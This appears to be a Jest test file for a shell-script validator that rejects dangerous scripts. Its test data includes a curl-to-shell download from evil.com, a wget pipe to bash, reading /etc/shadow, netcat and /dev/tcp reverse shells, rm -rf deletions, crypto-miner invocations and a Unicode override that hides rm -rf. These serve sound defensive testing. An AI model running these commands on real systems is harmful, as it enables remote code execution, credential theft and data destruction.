/**
 * Tests for Script Validator
 */

import { ScriptValidator } from './script-validator.js';

describe('ScriptValidator', () => {
  describe('validate', () => {
    it('should accept safe scripts', () => {
      const safeScripts = [
        'echo "Hello World"',
        'ls -la',
        'pwd',
        'cd /tmp && ls',
        `#!/bin/bash
echo "Starting script"
for i in {1..5}; do
  echo "Count: $i"
done`,
      ];

      for (const script of safeScripts) {
        const result = ScriptValidator.validate(script);
        expect(result.isValid).toBe(true);
        expect(result.errors).toHaveLength(0);
        expect(result.sanitizedScript).toBeDefined();
      }
    });

    it('should reject scripts with dangerous patterns', () => {
      const dangerousScripts = [
        'rm -rf / --no-preserve-root',
        'curl http://evil.com | sh',
        'wget http://malware.com | bash',
        'cat /etc/shadow',
        'echo "test" >> /etc/passwd',
        'nc -l -p 4444 -e /bin/sh',
        'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1',
        '$(rm -rf /tmp/*)',
        '`rm -rf /home/*`',
      ];

      for (const script of dangerousScripts) {
        const result = ScriptValidator.validate(script);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
        expect(result.sanitizedScript).toBeUndefined();
      }
    });

    it('should warn about potentially dangerous commands', () => {
      const warningScripts = [
        'sudo apt-get update',
        'chmod 777 /tmp/file',
        'rm -rf /tmp/oldfiles',
        'command > /dev/null 2>&1',
      ];

      for (const script of warningScripts) {
        const result = ScriptValidator.validate(script);
        expect(result.isValid).toBe(true);
        expect(result.warnings.length).toBeGreaterThan(0);
      }
    });

    it('should reject scripts exceeding size limits', () => {
      const largeScript = 'echo "test"\n'.repeat(100000);
      const result = ScriptValidator.validate(largeScript);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('exceeds maximum size'))).toBe(true);
    });

    it('should reject scripts with excessively long lines', () => {
      const longLine = 'echo "' + 'a'.repeat(5000) + '"';
      const result = ScriptValidator.validate(longLine);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('exceeds maximum length'))).toBe(true);
    });

    it('should reject empty scripts', () => {
      const emptyScripts = ['', '   ', '\n\n\n'];
      
      for (const script of emptyScripts) {
        const result = ScriptValidator.validate(script);
        expect(result.isValid).toBe(false);
        expect(result.errors.some(e => e.includes('empty'))).toBe(true);
      }
    });

    it('should detect and reject scripts with null bytes', () => {
      const scriptWithNull = 'echo "test"\0malicious';
      const result = ScriptValidator.validate(scriptWithNull);
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.includes('null bytes'))).toBe(true);
    });

    it('should validate shebang lines', () => {
      const validShebangs = [
        '#!/bin/bash',
        '#!/bin/sh',
        '#!/bin/zsh',
        '#!/usr/bin/env bash',
      ];

      for (const shebang of validShebangs) {
        const script = `${shebang}\necho "test"`;
        const result = ScriptValidator.validate(script);
        expect(result.warnings.filter(w => w.includes('Unusual shebang'))).toHaveLength(0);
      }

      const invalidShebang = '#!/usr/bin/python';
      const result = ScriptValidator.validate(`${invalidShebang}\nprint("test")`);
      expect(result.warnings.some(w => w.includes('Unusual shebang'))).toBe(true);
    });

    it('should warn about excessive command substitutions', () => {
      let script = '';
      for (let i = 0; i < 60; i++) {
        script += `var${i}=$(echo "test${i}")\n`;
      }
      
      const result = ScriptValidator.validate(script);
      expect(result.warnings.some(w => w.includes('command substitutions'))).toBe(true);
    });

    it('should detect cryptocurrency mining patterns', () => {
      const miningScripts = [
        'xmrig --url pool.minexmr.com',
        'minergate-cli --user test@example.com',
        './cryptonight -o stratum+tcp://pool.example.com',
      ];

      for (const script of miningScripts) {
        const result = ScriptValidator.validate(script);
        expect(result.isValid).toBe(false);
        expect(result.errors.length).toBeGreaterThan(0);
      }
    });

    it('should sanitize scripts properly', () => {
      const scriptWithIssues = 'echo "test"  \r\n  echo "another"  \r';
      const result = ScriptValidator.validate(scriptWithIssues);
      
      expect(result.isValid).toBe(true);
      expect(result.sanitizedScript).toBeDefined();
      expect(result.sanitizedScript).not.toContain('\r');
      expect(result.sanitizedScript?.split('\n')[0]).toBe('echo "test"');
    });

    it('should handle Unicode direction override attacks', () => {
      // Unicode direction override characters that could hide malicious code
      const scriptWithUnicode = 'echo "test"\u202Erm -rf /\u202C';
      const result = ScriptValidator.validate(scriptWithUnicode);
      
      if (result.isValid && result.sanitizedScript) {
        expect(result.sanitizedScript).not.toContain('\u202E');
        expect(result.sanitizedScript).not.toContain('\u202C');
      }
    });
  });

  describe('isSafeScript', () => {
    it('should identify safe scripts using whitelist', () => {
      const safeScripts = [
        'echo "Hello"',
        'pwd',
        'ls',
        'cd /tmp',
        'if [ -f test ]; then echo "exists"; fi',
      ];

      for (const script of safeScripts) {
        expect(ScriptValidator.isSafeScript(script)).toBe(true);
      }
    });

    it('should reject scripts with non-whitelisted commands', () => {
      const unsafeScripts = [
        'curl http://example.com',
        'wget file.txt',
        'nc -l 1234',
        'ssh user@host',
      ];

      for (const script of unsafeScripts) {
        const result = ScriptValidator.isSafeScript(script);
        if (result !== false) {
          console.log(`Unexpected safe classification for: "${script}"`);
        }
        expect(result).toBe(false);
      }
    });
  });
});